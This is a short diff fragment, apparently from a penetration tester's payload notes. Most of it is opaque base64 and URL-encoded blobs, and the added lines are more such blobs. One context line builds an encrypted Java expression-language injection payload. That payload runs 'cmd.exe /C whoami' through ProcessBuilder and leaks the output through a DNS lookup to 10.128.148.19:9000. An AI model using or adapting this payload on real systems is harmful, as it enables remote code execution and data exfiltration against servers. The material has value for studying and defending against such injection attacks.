@@ -57,3 +57,10 @@ m8D8GBbiZTzuho4QHNxjo4sLPmulFLmEXSl3CYnB663eCKN557lvAPJEHSBiYH8ho3O%2BUzU4pdQlf3
 payload = encrypt("${InetAddress.getByName(new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd.exe\",\"/C\",\"whoami\").start().getInputStream()).useDelimiter(\"\\\\A\").next() + \".10.128.148.19:9000\")}")
 jZk/RSd3mTpuFzoTtRoASiq1HAjjkUQ+PDNHHm3Wq1z05/jENBrwYrbSWE7gCvQ5d2BRTuiCguCAZscedBQFEfUryiBNXBawpechYdnKDfOc3Om1dd+SldR0ABfyH9Lrbka/ZB5TmQBRRgrLAd7osAKLJIh+AwYpBDEB7tPWpvGre36Ngba8BAfNOX4g6v+A8OCpfDjPK52uhfWsAnxNmwUcYkMWvQcou+7TC4Mf6xQpyrgCfyxz+w==
 
+
+
+
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkU6TYWScQAJjELfAYLoT3UCeawYSgvZncBO4oeaErL4z9wB0lIhA3GiqBEbzeU4yStbs4kE6yJM0ndInDz4rQZHgQvZJ8vXTUh35CfKYNy4X3Ws3sZazcSLEoniktj6+fAL6eRk7O+uHpRDnM9QuUriXlueLHgpk85m1UqFPnIGpwQ857nlUDHxPV6gbEGyJECn/JnbClGlcffQwTcDVrX0kMoGX0xgYC/Fhgs6TyeyMXROOB2Jf1iS+E56bUxo7WRLxZ3oefCyPXt5zZkODft59V5O7e2jp8t/NSeKNHmrTMMaLdFxjc5HFQQ8FyrErZ9Xx5s2R+5k3Jcf+DhXe9XTOMKpDCqZM9EgkyGg/In9IExiuiCJ0moq9n3EHG+82rX+u26NtOa9jBjrE7cK8eTU
+
+
+uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVS0sLD9kSCqoVA4m18wHYPZOCuAMFNzDqI9l6IrnLZa1JJBBTPBCW6zsM94fZYdnHTRN9Yy4Ky0NSa94/8XutOHLjZlv5p9le3hZcNGv8TcYcIvTfnPINs0yLe1BDVMCuB4Ga2D5nHAcACtW+hEFgKCEklXhsw1qe8FO7hNqsvzDn9o/jMhQ85IW24haWDiZJ
